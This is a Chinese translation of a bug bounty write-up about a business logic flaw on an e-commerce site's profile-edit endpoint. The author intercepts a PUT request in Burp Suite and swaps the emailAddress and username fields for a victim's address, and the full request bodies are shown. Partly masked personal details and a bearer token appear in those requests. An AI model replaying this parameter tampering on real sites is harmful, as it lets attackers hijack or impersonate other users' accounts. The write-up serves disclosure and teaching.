# 在 10 分钟内中断应用程序的用户注册过程

> 原文：<https://infosecwriteups.com/disrupting-an-applications-registration-process-in-10-mins-eab63cffd5eb?source=collection_archive---------0----------------------->

所以像往常一样，这篇文章将分为三个部分

1.  引言。
2.  漏洞描述。
3.  繁殖的步骤。

![](img/49e450dc5eeec7ea02c5cd8a4f54ff97.png)

# 介绍

> **什么是业务逻辑漏洞？**
> 
> 业务逻辑漏洞是应用程序设计和实现中的缺陷，它允许攻击者引发意外行为。这可能使攻击者能够操纵合法功能来实现恶意目标。这些缺陷通常是由于未能预见到可能出现的异常应用程序状态，因此未能安全地处理它们。

【https://portswigger.net/web-security/logic-flaws】点击 [*了解详情*](https://portswigger.net/web-security/logic-flaws)

那么就从我们的目标介绍开始吧。我寻找的目标是一个电子商务网站。它具有电子商务商店应该具有的所有基本功能。

**目标功能:2FA、登录和注册、个人资料编辑、购物车、结账等。**

在这篇文章中，我们将重点放在概要文件编辑功能上，因为我发现了这个特定功能中的业务逻辑缺陷。

> **我来问你，一个开发者在个人资料编辑页面上包含的基本功能有哪些？**
> 
> **答:**用户能够改变他的电子邮件地址，编辑他的名字和改变其他基本信息。

既然我们已经知道了基本的东西，并且有了要测试的功能范围，那么让我们从我们的攻击方法开始。

# 漏洞描述

![](img/e752af05657bc10dcf9a90b7e02a3765.png)

这个应用程序让我更改个人资料中的基本信息，但不知何故没有给我任何权限来更改我的电子邮件地址。我当时就觉得这有点。

所以我只是想看看当我想更新名字等基本信息时它发出的请求。(将在稍后的文章中详细解释)

我截取了那个特定的请求，我看到的有点令人惊讶。

尽管我只是想更改我的名字，但该请求发送了所有其他个人资料数据，包括我现在的电子邮件(在 emailAddress & username 参数中)。因此，由于我通常不允许更改我的电子邮件地址，我想为什么不通过更新电子邮件地址和用户名参数来更改这个特定请求中的电子邮件地址。

我用受害者的电子邮件地址更新了参数，令我惊讶的是，它成功了。记住我没有就此打住，呵呵。

**电子邮件地址更新成功。现在，我只需扩大这一漏洞的影响，我已经在重现步骤中展示了这一点。**

# 复制步骤:

1)在 [https://www。****.in/en/](https://www.glowandlovelycareers.in/en/) 并验证它。
2)访问 [https://www。****.在/en/](https://www.glowandlovelycareers.in/en/) 并且为了这次攻击在编辑个人资料页面上编辑任何东西。
3)现在点击 save changes 按钮，在 burp suite 中拦截该请求。

**拦截的请求看起来像这样:**

```
PUT /useraccounts/users/5f53963ea829f23e7dfa2fc3 HTTP/1.1
Host: dl****.execute-api.ap-south-1.amazonaws.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.*****.in/
Authorization: Bearer eyJhbG****dhMjEyNTM1M2QxIiwiY2xpZW50X2lkIjoidGVzdCJ9.2xHW9goHxG08dw28q-1xHyyXWvevelTJ6E-IU0_yh50
Content-Type: application/json
Content-Length: 939
Origin: https://www.****.in
Connection: close{"id":"5f53963ea829f23e7***","creationDate":***,"modifyDate":1599316219***,"firstName":"Karan","lastName":"Arora","mobileNo":"***943914",**"emailAddress":"adversaryc***@gmail.com”**,dateOfBirth":1016562600000,"gender":"male","shorterTestTaken":false,"longerTestTaken":false,"alternateEmailAddress":"","careerIntentId":"5ea9e91bdd50a63d28c5ca9b","lang":"en","userEnrollments":{"id":null,"userId":"5f53963ea829f23e7dfa2fc3","onlineTestEnrollments":{"categories":[],"tests":[]}},"appliedforWonk":false,"isDOBUpdated":true,**"username":"adversaryc***@gmail.com"**}
```

**现在更改高亮显示的参数，将电子邮件地址更改为受害者的电子邮件地址。**

> *受害者电子邮件地址:karn***@gmail.com*

**变更请求**

```
PUT /useraccounts/users/5f53963ea829f23e7dfa2fc3 HTTP/1.1
Host: dl****.execute-api.ap-south-1.amazonaws.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.*****.in/
Authorization: Bearer eyJhbG****dhMjEyNTM1M2QxIiwiY2xpZW50X2lkIjoidGVzdCJ9.2xHW9goHxG08dw28q-1xHyyXWvevelTJ6E-IU0_yh50
Content-Type: application/json
Content-Length: 939
Origin: https://www.****.in
Connection: close{"id":"5f53963ea829f23e7***","creationDate":***,"modifyDate":1599316219***,"firstName":"Karan","lastName":"Arora","mobileNo":"***943914",**"emailAddress":"**[**karn***@gmail.com**](mailto:karnxa007@gmail.com)**"**,dateOfBirth":1016562600000,"gender":"male","shorterTestTaken":false,"longerTestTaken":false,"alternateEmailAddress":"","careerIntentId":"5ea9e91bdd50a63d28c5ca9b","lang":"en","userEnrollments":{"id":null,"userId":"5f53963ea829f23e7dfa2fc3","onlineTestEnrollments":{"categories":[],"tests":[]}},"appliedforWonk":false,"isDOBUpdated":true,**"username":"**[**karn***@gmail.com**](mailto:karnxa007@gmail.com)**"**}
```

并转发此请求。现在帐户将被更新，您可以在个人资料页面上看到发生的变化。

> **请注意，不会有通知发送到受害者的电子邮件地址，这将成为攻击者的额外奖励，这帮助我增加了漏洞的影响。**

# **附加漏洞**

为了仔细检查是否发生了变化，我注销并尝试用攻击者的原始电子邮件 adver***@gmail.com(**这是后来添加到我的总体奖励中的另一个漏洞，因为攻击者能够用他的旧电子邮件地址登录，即使在用新地址更新后也是如此。**)

转到个人资料部分，你会看到受害者 karn***@gmail.com 的默认电子邮件地址，而不是攻击者的电子邮件，现在攻击者对该帐户进行的任何更改都将被记录为由 karn***@gmail.com 执行。

## 这就是我如何破坏他们的应用程序的整个帐户注册功能。

***推特⬇***

[https://twitter.com/Itskaranxa](https://twitter.com/Itskaranxa)

如果你觉得这值得你花时间，那么

![](img/61a36e9ca717a45f98e545e62ccb2e69.png)

**订阅更多。保持好奇！！**